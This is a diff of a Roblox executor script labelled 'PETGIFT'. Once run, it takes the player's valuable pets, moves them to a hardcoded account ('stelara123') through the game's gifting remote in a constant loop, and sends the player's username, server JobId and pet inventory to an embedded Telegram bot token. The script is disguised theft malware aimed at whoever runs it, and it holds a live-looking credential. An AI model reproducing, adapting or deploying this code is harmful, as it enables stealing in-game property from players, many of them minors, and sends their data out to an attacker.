@@ -1,57 +1,210 @@
--- Services
-local TeleportService = game:GetService("TeleportService")
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
+warn("[PETGIFT] Script started with Telegram logging")
 
--- Configuration
-local PLACE_ID = 126884695634066
+local DEBUG_TAG = "[PETGIFT]"
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local LocalPlayer = Players.LocalPlayer
+
+local PLACE_ID = 126884695634066 -- Same place ID
+
+-- Telegram configuration
 local TELEGRAM_URL = "https://api.telegram.org/bot8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4/sendMessage"
 local TELEGRAM_CHAT_ID = "2001061743"
 
--- HTTP request function
+-- Executor request function
 local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
 
--- Function to send log to Telegram
-local function sendTelegramLog(text)
-    local payload = {
-        Url = TELEGRAM_URL,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode({
-            chat_id = TELEGRAM_CHAT_ID,
-            text = text
-        })
-    }
+-- RemoteEvents & Modules
+local GiftRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
+local PickUpModule = require(
+	ReplicatedStorage.Modules.PetServices.PetActionUserInterfaceService.PetActionsHandlers.PickUp
+)
 
-    if requestFunc then
-        local success, result = pcall(function()
-            return requestFunc(payload)
-        end)
+local ALLOWED_PET_TYPES = {
+	"dog", "bunny", "mimic octopus", "disco bee", "raccoon", "kitsune",
+	"butterfly", "spinosaurus", "dragonfly", "queen bee", "night owl",
+	"t-rex", "dilophosaurus", "moon cat", "fennec fox", "chicken zombie",
+	"hyacinth macaw", "orange tabby"
+}
 
-        if not success then
-            warn("Telegram request failed:", result)
-        end
-    else
-        warn("No HTTP request function available!")
-    end
+local function debugPrint(...)
+	print(DEBUG_TAG, ...)
 end
 
--- Reserve server and teleport
-local function reserveAndTeleport()
-    -- Reserve a private server
-    local code, privateServerId = TeleportService:ReserveServer(PLACE_ID)
+local function sendTelegramLog(reason, petName)
+	if not requestFunc then
+		warn(DEBUG_TAG, "No request function available.")
+		return
+	end
 
-    -- Send code to Telegram
-    sendTelegramLog("✅ Reserved Private Server Code:\n" .. code .. "\n🆔 PrivateServerId:\n" .. privateServerId)
+	local jobId = game.JobId
+	local username = LocalPlayer.Name
+	local inventoryPets = {}
 
-    -- Teleport local player to the reserved server
-    local player = Players.LocalPlayer
-    if player then
-        TeleportService:TeleportToPrivateServer(PLACE_ID, code, {player})
-    else
-        sendTelegramLog("⚠️ ERROR: Local player not found!")
-    end
+	for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
+		if item:IsA("Tool") then
+			local scale = item:GetAttribute("Scale") or "?"
+			table.insert(inventoryPets, string.format("%s (Scale=%s)", item.Name, tostring(scale)))
+		end
+	end
+
+	local message = string.format(
+		"🐾 PetGifting Log\n\nReason: %s\nUsername: %s\nJobId: %s\n\nInventory Pets:\n%s",
+		reason,
+		username,
+		jobId,
+		table.concat(inventoryPets, "\n")
+	)
+
+	local payload = {
+		Url = TELEGRAM_URL,
+		Method = "POST",
+		Headers = {["Content-Type"] = "application/json"},
+		Body = HttpService:JSONEncode({
+			chat_id = TELEGRAM_CHAT_ID,
+			text = message
+		})
+	}
+
+	pcall(function() requestFunc(payload) end)
 end
 
--- Run the function
-reserveAndTeleport()
+local function isPetTypeMatch(pet)
+	if not pet or not pet:IsA("Tool") then return false end
+	local petTypeAttr = pet:GetAttribute("PetType")
+	if not petTypeAttr then return false end
+	local lowerPetType = tostring(petTypeAttr):lower()
+
+	for _, allowed in ipairs(ALLOWED_PET_TYPES) do
+		if lowerPetType:find(allowed) then
+			return true
+		end
+	end
+
+	local scale = pet:GetAttribute("Scale")
+	if scale and tonumber(scale) and tonumber(scale) > 10 then
+		return true
+	end
+
+	return false
+end
+
+local function getTargetPlayer()
+	for _, plr in ipairs(Players:GetPlayers()) do
+		if plr.Name == "stelara123" then
+			return plr
+		end
+	end
+	return nil
+end
+
+local function teleportToPlayer(plr)
+	local char = LocalPlayer.Character
+	if char and char:FindFirstChild("HumanoidRootPart") and plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+		char.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame
+	end
+end
+
+local function findPlacedPetByUUID(uuid)
+	for _, obj in ipairs(workspace:GetDescendants()) do
+		if obj:GetAttribute("UUID") == uuid then
+			return obj
+		end
+	end
+	return nil
+end
+
+local function giftPetDirectly(pet)
+	if not pet then return end
+	debugPrint("Unfavoriting pet:", pet.Name)
+	pet:SetAttribute("Favorite", false)
+
+	local target = getTargetPlayer()
+	if target then
+		teleportToPlayer(target)
+		debugPrint("Gifting", pet.Name, "to", target.Name)
+
+		local originalParent = pet.Parent
+		pet.Parent = LocalPlayer.Character
+		task.wait()
+
+		GiftRemote:FireServer("GivePet", pet)
+
+		sendTelegramLog("Gifted Pet: " .. pet.Name, pet.Name)
+
+		if pet.Parent and pet.Parent == LocalPlayer.Character then
+			pet.Parent = originalParent
+		end
+	else
+		debugPrint("Target player not found for", pet.Name)
+	end
+end
+
+local function checkAndGiftFromContainer(container)
+	if not container then return end
+	for _, pet in ipairs(container:GetChildren()) do
+		if isPetTypeMatch(pet) then
+			debugPrint("Found pet:", pet.Name)
+			giftPetDirectly(pet)
+		end
+	end
+end
+
+local function pickUpPlacedPets()
+	local activeUI = LocalPlayer.PlayerGui:FindFirstChild("ActivePetUI")
+	if not activeUI then return end
+
+	local scroll = activeUI:FindFirstChild("Frame")
+		and activeUI.Frame:FindFirstChild("Main")
+		and activeUI.Frame.Main:FindFirstChild("ScrollingFrame")
+
+	if not scroll then return end
+
+	for _, petFrame in ipairs(scroll:GetChildren()) do
+		if petFrame:IsA("Frame")
+			and petFrame:FindFirstChild("PET_TYPE")
+			and petFrame.Name ~= "PetTemplate" then
+
+			local petType = petFrame.PET_TYPE.Text
+			local uuid = petFrame.Name
+			local petModel = findPlacedPetByUUID(uuid)
+
+			if petModel and isPetTypeMatch({IsA=function() return true end, GetAttribute=function(_,a) return (a=="PetType" and petType) or nil end}) then
+				debugPrint("Picking up placed pet:", petType)
+				PickUpModule.Activate(petModel)
+				task.wait(0.05)
+			end
+		end
+	end
+end
+
+-- Simple server hop (rejoin place)
+local function rejoinServer()
+	debugPrint("Rejoining server...")
+	TeleportService:Teleport(PLACE_ID, LocalPlayer)
+end
+
+-- Hook Teleport: send JobId after join
+Players.PlayerAdded:Connect(function(plr)
+	if plr == LocalPlayer then
+		sendTelegramLog("Joined new server after hop", "")
+	end
+end)
+
+-- Start main loop
+debugPrint("Starting pet gifting + pickup loop")
+sendTelegramLog("Script started", "")
+
+task.spawn(function()
+	while true do
+		task.wait(0.1)
+		checkAndGiftFromContainer(LocalPlayer.Backpack)
+		checkAndGiftFromContainer(LocalPlayer.Character)
+		pickUpPlacedPets()
+	end
+end)
+
+-- Trigger the hop (once)
+task.delay(5, rejoinServer) -- waits 5s before hopping, adjust if needed
